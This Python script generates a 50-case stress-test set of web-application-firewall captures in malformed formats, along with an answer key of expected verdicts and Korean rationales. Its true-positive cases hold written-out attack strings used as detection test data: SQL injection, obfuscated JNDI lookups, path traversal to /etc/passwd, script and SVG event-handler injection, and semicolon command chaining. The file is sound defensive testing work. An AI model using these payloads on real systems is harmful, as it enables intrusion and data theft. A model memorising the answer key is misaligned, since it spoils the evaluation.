"""Deterministic, network-free fixture construction. Never executes payloads.

The default mode checks the checked-in samples. --emit-files prints documents
for an editor/apply_patch consumer; it does not write files or call a model.
"""
import argparse
from collections import Counter
import hashlib
import json
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
DIRECTORY = Path("samples/waf-parser-stress-v1")


def compact(value):
    return json.dumps(value, ensure_ascii=False, separators=(",", ":"))


def request(method, target, body="", headers=()):
    values = ["Host: parser.example.test", "User-Agent: FixtureParserClient/1.0",
              "Cookie: session=FIXTURE_SESSION_NOT_A_REAL_CREDENTIAL", *headers]
    if body:
        values.append(f"Content-Length: {len(body.encode('utf-8'))}")
    return f"{method} {target} HTTP/1.1\r\n" + "\r\n".join(values) + "\r\n\r\n" + body


def build():
    cases = []

    def add(group, title, verdict, method, target, body, quote, rationale, *, headers=(), form=None):
        cases.append(dict(group=group, title=title, verdict=verdict, method=method, target=target,
                          body=body, quote=quote, rationale=rationale, headers=headers, form=form))

    tp, fp, hold = "true_positive", "false_positive", "inconclusive"
    # Missing a protocol does not erase an identifiable query or header.
    g = "missing_protocol"
    add(g, "버전 없는 요청의 SQL 조건 삽입", tp, "GET", "/catalog?id=7%27%20OR%2071%3D71--", "", "7%27%20OR%2071%3D71--", "상품 식별자에 문자열 종료·참 조건·주석이 함께 삽입되어 있다.")
    add(g, "버전 없는 요청 헤더의 JNDI 조회식", tp, "GET", "/search?q=guide", "", "${jndi:ldap://lookup.invalid/fixture-a}", "사용자 제어 헤더에 외부 조회를 유도하는 JNDI 식이 있다. 조회 성공은 미확인이다.", headers=("X-Trace: ${jndi:ldap://lookup.invalid/fixture-a}",))
    add(g, "버전 없는 성명 검색의 작은따옴표", fp, "GET", "/contacts?name=O%27Reilly", "", "name=O%27Reilly", "성명 안의 작은따옴표 외에 SQL 조건식이나 실행 구문은 없다.")
    add(g, "버전 없는 JSON 문서의 비교 연산자", fp, "POST", "/notes", '{"format":"plain_text","text":"Compare 2 < 3 and 4 > 1 in arithmetic."}', '"format":"plain_text"', "평문 메모의 수학 비교식이며 실행 가능한 태그나 스크립트가 없다.", headers=("Content-Type: application/json",))
    add(g, "버전과 요청 본문이 모두 누락된 업로드", hold, "POST", "/import", "", "Content-Length: 2048", "길이 헤더만 있고 업로드 내용이 없어 탐지된 본문을 확인할 수 없다.", headers=("Content-Type: application/octet-stream", "Content-Length: 2048"))

    # Literal backslashes are a logging representation, not real line endings.
    g = "literal_line_escapes"
    add(g, "문자형 줄바꿈에 감싸진 UNION 구문", tp, "GET", "/items?id=0%20UNION%20SELECT%20NULL,NULL--", "", "UNION%20SELECT%20NULL,NULL--", "조회 식별자에 UNION SELECT와 주석을 넣는 공격 시도가 남아 있다.")
    add(g, "문자형 줄바꿈에 감싸진 경로 탈출", tp, "GET", "/download?file=..%2F..%2F..%2Fetc%2Fpasswd", "", "..%2F..%2F..%2Fetc%2Fpasswd", "파일 다운로드 인자로 상위 경로 이동과 시스템 파일을 지정한다.")
    add(g, "문자형 줄바꿈과 Windows 설명 경로", fp, "POST", "/help/drafts", compact({"format": "plain_text", "text": r"Save reports under C:\reports\monthly."}), '"format":"plain_text"', "도움말의 Windows 경로 표기이며 서버 경로 탈출이나 명령 실행 구문이 아니다.", headers=("Content-Type: application/json",))
    add(g, "문자형 줄바꿈과 한글 검색어", fp, "GET", "/search?q=%ED%9A%8C%EC%9D%98%EB%A1%9D&sort=updated", "", "sort=updated", "일반 문서 검색어와 정렬 옵션이며 인코딩만으로 공격이라 볼 수 없다.")
    add(g, "문자형 줄바꿈 로그의 수집 중단", hold, "POST", "/api/filter", '{"filter":', '"filter":', "필터의 실제 값과 객체 종료 부분이 잘려 처리 의미를 확정할 수 없다.", headers=("Content-Type: application/json", "X-Capture-State: truncated"))

    g = "json_export_envelope"
    add(g, "JSON 로그 필드 내부의 인증 우회 구문", tp, "POST", "/session", '{"username":"\' OR 83=83--","password":"FIXTURE_ONLY"}', "' OR 83=83--", "인증 입력값에 SQL 참 조건과 주석이 들어 있다. 로그 포장과 공격 구문을 구분한다.", headers=("Content-Type: application/json",))
    add(g, "JSON 로그 필드 내부의 SVG 이벤트 핸들러", tp, "GET", "/preview?html=%3Csvg%20onload%3Dalert(83)%3E", "", "%3Csvg%20onload%3Dalert(83)%3E", "HTML 미리보기 값에 실행형 SVG 이벤트 핸들러를 삽입한다.")
    add(g, "JSON 로그 필드 내부의 일반 CSV 내보내기", fp, "GET", "/reports/export?format=csv&quarter=2026Q3", "", "format=csv&quarter=2026Q3", "정상 형식·기간 파라미터로 실행형 표현식이 없다.")
    add(g, "JSON 로그와 이스케이프된 예제 따옴표", fp, "POST", "/manual/pages", '{"format":"plain_text","text":"A quotation mark is written as \\\" in JSON."}', '"format":"plain_text"', "문서의 JSON 표기 예시이며 이스케이프가 곧 공격을 뜻하지 않는다.", headers=("Content-Type: application/json",))
    add(g, "JSON 내보내기에서 원문 값이 빠진 이벤트", hold, "POST", "/upload", "", "capture_state", "내보내기 메타데이터에 탐지 사실만 있고 원문 값이 null이다.", form="empty_export")

    g = "syslog_prefixed_request"
    add(g, "Syslog 접두사 뒤의 셸 구분자", tp, "GET", "/tools/ping?host=127.0.0.1%3Bid", "", "host=127.0.0.1%3Bid", "네트워크 진단 인자에 세미콜론과 별도 명령을 이어 붙인 시도다.")
    add(g, "Syslog 접두사 뒤의 이중 인코딩 경로", tp, "GET", "/files?name=%252e%252e%252f%252e%252e%252fetc%252fpasswd", "", "%252e%252e%252f%252e%252e%252fetc%252fpasswd", "이중 인코딩한 상위 경로와 시스템 파일 지정이 파일 인자에 함께 있다. 서버의 실제 디코딩 횟수는 미확인이다.")
    add(g, "Syslog 접두사 뒤의 정상 상태 조회", fp, "GET", "/health?detail=basic", "", "/health?detail=basic", "기본 상태 조회 외에 공격 구문이 없다.")
    add(g, "Syslog 접두사 뒤의 허용 문자 검색", fp, "GET", "/search?q=select+a+report&lang=en", "", "select+a+report", "일상 문구의 select 단어이며 SQL 문법 조합이 없다.")
    add(g, "Syslog 메시지에 요청 길이만 남은 경우", hold, "GET", "/", "", "capture=omitted", "요청 원문 없이 길이와 수집 생략 표지만 남아 탐지 근거를 확인할 수 없다.", form="syslog_omitted")

    g = "http2_pseudo_headers"
    add(g, "HTTP/2 텍스트 덤프의 SQL 주석 분리", tp, "GET", "/catalog?id=1%27/**/OR/**/97=97--", "", "%27/**/OR/**/97=97--", "식별자에 문자열 종료와 주석으로 분리한 참 조건이 있다.")
    add(g, "HTTP/2 텍스트 덤프의 이미지 오류 핸들러", tp, "GET", "/preview?html=%3Cimg%20src=x%20onerror=alert(97)%3E", "", "onerror=alert(97)", "렌더링 대상 값에 오류 이벤트 실행 코드를 삽입한다.")
    add(g, "HTTP/2 텍스트 덤프의 날짜 범위 검색", fp, "GET", "/events?from=2026-09-01&to=2026-09-10", "", "from=2026-09-01&to=2026-09-10", "날짜 범위 파라미터로 공격 문법이 없다.")
    add(g, "HTTP/2 텍스트 덤프의 수학 설명 JSON", fp, "POST", "/drafts", '{"format":"plain_text","formula":"x < y && y > 0"}', '"formula":"x < y && y > 0"', "평문 초안의 비교식이며 HTML 요소나 실행 구문이 아니다.", headers=("Content-Type: application/json",))
    add(g, "HTTP/2 덤프에 서로 다른 path가 중복된 경우", hold, "GET", "/documents/public", "", ":path: /documents/private", "서로 다른 path가 중복되어 유효 요청·대상 경로를 확정할 수 없다. 파싱 비정상만으로 공격 성공을 추정하지 않는다.", form="duplicate_path")

    g = "tabbed_request_line"
    add(g, "탭으로 구분한 요청 라인의 SQL 조건", tp, "GET", "/search?q=%27%20OR%20101=101--", "", "%27%20OR%20101=101--", "요청 라인 구분자가 비표준이어도 검색 값에 SQL 참 조건이 남아 있다.")
    add(g, "탭으로 구분한 요청과 난독화 JNDI", tp, "GET", "/catalog", "", "${${lower:j}ndi:ldap://lookup.invalid/fixture-b}", "헤더에 lower 연산을 이용한 JNDI 외부 조회 유도식이 있다.", headers=("X-Client: ${${lower:j}ndi:ldap://lookup.invalid/fixture-b}",))
    add(g, "탭으로 구분한 평범한 페이지 이동", fp, "GET", "/articles?page=2&size=20", "", "page=2&size=20", "페이지 번호·크기 외에 악의적 구문은 없으며 로깅 구분자 이상과 공격성을 구분한다.")
    add(g, "탭으로 구분한 요청의 파일명 세미콜론", fp, "GET", "/documents?title=minutes%3Bfinal.txt", "", "title=minutes%3Bfinal.txt", "문서 제목의 문장부호이며 셸 실행 인자나 후속 명령이 아니다.")
    add(g, "탭 구분 로그에서 내용 없이 이름만 남은 인자", hold, "POST", "/api/query", "query=", "X-Capture-State: values-removed", "값이 제거된 캡처이므로 빈 값을 근거로 원래 탐지 내용이 무해했다고 확정할 수 없다.", headers=("X-Capture-State: values-removed",))

    g = "bare_cr_and_header_folding"
    add(g, "CR 단독 줄바꿈의 경로 탈출", tp, "GET", "/download?path=../../../../etc/passwd", "", "path=../../../../etc/passwd", "다운로드 대상에 반복 상위 경로와 시스템 파일을 명시한다.")
    add(g, "CR 단독 줄바꿈의 스크립트 삽입", tp, "POST", "/preview/html", "<script>alert(109)</script>", "<script>alert(109)</script>", "HTML 미리보기 본문에 직접 실행형 스크립트를 넣는다.", headers=("Content-Type: text/html",))
    add(g, "접힌 설명 헤더의 문서용 키워드", fp, "GET", "/manual/http-headers", "", "X-Description: select a page", "접힌 설명 헤더의 일반 문구이며 쿼리 삽입 문법이 아니다.", headers=("X-Description: select a page\r\n from the navigation menu",), form="folded")
    add(g, "CR 단독 줄바꿈의 이름 JSON", fp, "POST", "/profile", '{"display_name":"D\'Angelo","locale":"it"}', "D'Angelo", "이름의 아포스트로피로 SQL 조건·주석 조합은 없다.", headers=("Content-Type: application/json",))
    add(g, "접힌 인증 헤더의 값이 중단된 로그", hold, "GET", "/account", "", "Authorization: Bearer", "인증값이 이어지는 부분과 판단에 필요한 탐지 내용이 잘려 있다.", headers=("Authorization: Bearer\r\n [capture interrupted]",), form="folded")

    g = "body_only_capture"
    add(g, "요청 라인 없이 남은 인증 JSON", tp, "POST", "/", '{"username":"\' OR 113=113--","password":"FIXTURE_ONLY"}', "' OR 113=113--", "인증 필드의 문자열 종료·참 조건·주석이 본문에 남아 있다.")
    add(g, "요청 라인 없이 남은 파일 조회 JSON", tp, "POST", "/", '{"operation":"download","file":"../../../../etc/passwd"}', "../../../../etc/passwd", "파일 다운로드 동작과 경로 탈출 값이 함께 남아 있다.")
    add(g, "본문만 남은 일반 연락처 JSON", fp, "POST", "/", '{"display_name":"O\'Reilly","department":"Research","quantity":2}', "O'Reilly", "일반 이름·부서·수량이며 작은따옴표 외에 SQL 의미가 없다.")
    add(g, "본문만 남은 보안 교육 평문 JSON", fp, "POST", "/", '{"title":"SQL safety notes","format":"plain_text","content":"Use bound parameters rather than constructing SQL strings."}', '"format":"plain_text"', "보안 문서의 평문 설명이며 실행형 공격 구문이 없다.")
    add(g, "본문도 복원되지 않은 gzip 표시", hold, "POST", "/", "[binary capture omitted; content-encoding=gzip; captured_bytes=0]", "captured_bytes=0", "압축 본문이 제공되지 않아 원래 요청의 공격성을 판단할 수 없다.")

    g = "multipart_and_duplicate_fields"
    boundary = "FixtureBoundaryParserStress"
    def multipart(name, value, filename=None):
        disposition = f'Content-Disposition: form-data; name="{name}"'
        if filename:
            disposition += f'; filename="{filename}"'
        return f"--{boundary}\r\n{disposition}\r\nContent-Type: text/plain\r\n\r\n{value}\r\n--{boundary}--\r\n"
    multi_headers = (f"Content-Type: multipart/form-data; boundary={boundary}",)
    add(g, "Multipart 폼 필드의 명령 연결", tp, "POST", "/tools/diagnose", multipart("host", "127.0.0.1;id"), "127.0.0.1;id", "진단 대상 폼 값에 별도 셸 명령을 이어 붙인다.", headers=multi_headers)
    add(g, "인코딩된 쿼리 이름과 중복 값의 SQL 삽입", tp, "GET", "/catalog?item%5Fid=7&item%5Fid=7%27%20OR%20127=127--", "", "item%5Fid=7%27%20OR%20127=127--", "반복 식별자 중 하나에 명확한 SQL 조건 삽입이 있다. 서버가 어느 값을 쓰는지는 성공 여부와 별개다.")
    add(g, "Multipart 평문 파일 이름의 세미콜론", fp, "POST", "/documents/upload", multipart("file", "Quarterly meeting notes. Nothing executable.", "minutes;final.txt"), 'filename="minutes;final.txt"', "파일명의 세미콜론과 평문 문서이며 명령 실행 구문이 아니다.", headers=multi_headers)
    add(g, "중복 Cookie에 포함된 정상 표시 이름", fp, "GET", "/preferences", "", "display_name=O%27Reilly", "표시 이름의 작은따옴표를 공격 조건식과 구분한다.", headers=("Cookie: display_name=O%27Reilly", "Cookie: theme=dark"))
    add(g, "반복 접근 범위 인자의 상충", hold, "GET", "/share?visibility=private&visibility=public", "", "visibility=private&visibility=public", "공개 범위가 상충하지만 애플리케이션의 중복 처리 규칙·권한 정책을 알 수 없다.")

    g = "length_and_framing_edges"
    add(g, "긴 무관 헤더 뒤의 난독화 JNDI", tp, "GET", "/catalog", "", "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://lookup.invalid/fixture-c}", "긴 잡음 뒤에도 외부 JNDI 조회 유도식이 존재한다. 원문 선별과 인용 보존을 확인한다.", headers=("X-Padding: " + "filler-" * 12000, "X-Trace: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://lookup.invalid/fixture-c}"))
    add(g, "청크 확장 표기와 HTML 실행 본문", tp, "POST", "/preview/html", "", "<svg onload=alert(131)>", "청크 형식으로 감싼 HTML 렌더링 입력에 실행형 이벤트 핸들러가 남아 있다.", form="chunked")
    add(g, "긴 정상 쿠키 뒤의 숫자형 페이지 요청", fp, "GET", "/reports?page=3&size=10", "", "page=3&size=10", "긴 쿠키 값 자체는 공격이 아니며 요청 인자에도 실행형 표현식이 없다.", headers=("Cookie: preferences=" + "fixture" * 900,))
    add(g, "본문 속 HTTP 구분자 예시 문서", fp, "POST", "/manual/drafts", "HTTP examples use a blank line.\r\n\r\nGET /example HTTP/1.1\r\nHost: example.test\r\n\r\nThis is quoted documentation.", "This is quoted documentation.", "평문 문서 안의 HTTP 예시를 두 번째 실제 요청으로 단정하지 않는 사례다.", headers=("Content-Type: text/plain",))
    add(g, "서로 다른 Content-Length와 일부 본문", hold, "POST", "/messages", "abc", "Content-Length: 19", "본문 길이 선언이 충돌하고 수집된 내용도 짧다. 전후단 처리와 캡처 범위 없이 스머글링 또는 정상으로 확정할 수 없다.", headers=("Content-Length: 19", "Content-Type: text/plain"))

    events, answers = [], []
    for index, case in enumerate(cases, 1):
        group, form = case["group"], case["form"]
        raw = request(case["method"], case["target"], case["body"], case["headers"])
        status = "success"
        if group == "missing_protocol":
            raw = raw.replace(" HTTP/1.1\r\n", "\r\n", 1); status = "partial"
        elif group == "literal_line_escapes":
            raw = raw.replace("\r\n", "\\r\\n"); status = "partial"
        elif group == "json_export_envelope":
            raw = compact({"record_type": "waf_capture", "request_text": None if form == "empty_export" else raw,
                           "capture_state": "missing" if form == "empty_export" else "complete"})
            status = "failed"
        elif group == "syslog_prefixed_request":
            raw = "<134>1 2026-09-10T00:00:00Z fixture-gw waf-capture - - - " + (
                "capture=omitted request_bytes=2048" if form == "syslog_omitted" else "request=" + raw)
            status = "failed"
        elif group == "http2_pseudo_headers":
            raw = f":method: {case['method']}\n:scheme: https\n:authority: parser.example.test\n:path: {case['target']}\n"
            raw += (":path: /documents/private\n" if form == "duplicate_path" else "")
            raw += "\n".join(case["headers"]) + "\n\n" + case["body"]
            status = "failed"
        elif group == "tabbed_request_line":
            raw = raw.replace(f"{case['method']} {case['target']} HTTP/1.1", f"{case['method']}\t{case['target']}\tHTTP/1.1", 1)
            status = "failed"
        elif group == "bare_cr_and_header_folding":
            raw = raw if form == "folded" else raw.replace("\r\n", "\r")
            status = "partial"
        elif group == "body_only_capture":
            raw = case["body"]; status = "failed"
        elif form == "chunked":
            content = "<svg onload=alert(131)>"
            raw = request("POST", "/preview/html", headers=("Transfer-Encoding: chunked", "Content-Type: text/html"))
            raw += f"{len(content.encode()):x};fixture=yes\r\n{content}\r\n0\r\n\r\n"
        quote = case["quote"]
        if group == "json_export_envelope" and form != "empty_export":
            quote = json.dumps(quote, ensure_ascii=False)[1:-1]
        assert quote in raw, (index, group, "reference_excerpt_not_found")
        identifier = f"waf-parser-v1-{index:03d}"
        events.append(dict(event_id=identifier, difficulty="hard", test_category="parser/" + group,
            case_name=case["title"], expected_verdict=case["verdict"], company_name="Fixture Parser Lab",
            src_ip=f"192.0.2.{index + 10}", dest_ip="198.51.100.90", src_port=42000 + index,
            dest_port=443, payload=raw, signature="HTTP Request Inspection", event_name="WAF Detection",
            waf_vendor="Generic-Fixture", waf_action="D" if index % 2 else "A"))
        answers.append(dict(event_id=identifier, case_name=case["title"], test_category="parser/" + group,
            expected_verdict=case["verdict"], expected_parser_version="generic-http-v3", expected_parse_status=status,
            rationale_ko=case["rationale"], important_evidence=[dict(field="payload", excerpt=quote)],
            verification_notes_ko="작성 시 고정한 가상 기대값이다. 요청 형식·파서 인식과 공격성을 구분한다. 공격 성공·업무 권한·실제 서버 해석은 입증하지 않는다. 해설은 업로드하거나 모델에 전달하지 않는다."))
    assert len(events) == 50 and len({item["payload"] for item in events}) == 50
    assert Counter(item["expected_verdict"] for item in events) == {tp: 20, fp: 20, hold: 10}
    return events, answers


def documents():
    events, answers = build()
    return {str(DIRECTORY / name): json.dumps(value, ensure_ascii=False, indent=2) + "\n"
            for name, value in (("parser_stress_50.json", events), ("reference/answers_50.json", answers))}


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--emit-files", action="store_true")
    args = parser.parse_args()
    generated = documents()
    if args.emit_files:
        print(json.dumps(generated, ensure_ascii=False))
        return
    for path, content in generated.items():
        if (ROOT / path).read_text(encoding="utf-8") != content:
            raise SystemExit("fixture_content_differs: " + path)
    events, _ = build()
    print(json.dumps({"checked": len(events), "files": {path: hashlib.sha256(content.encode()).hexdigest()
                                                        for path, content in generated.items()}}))


if __name__ == "__main__":
    main()
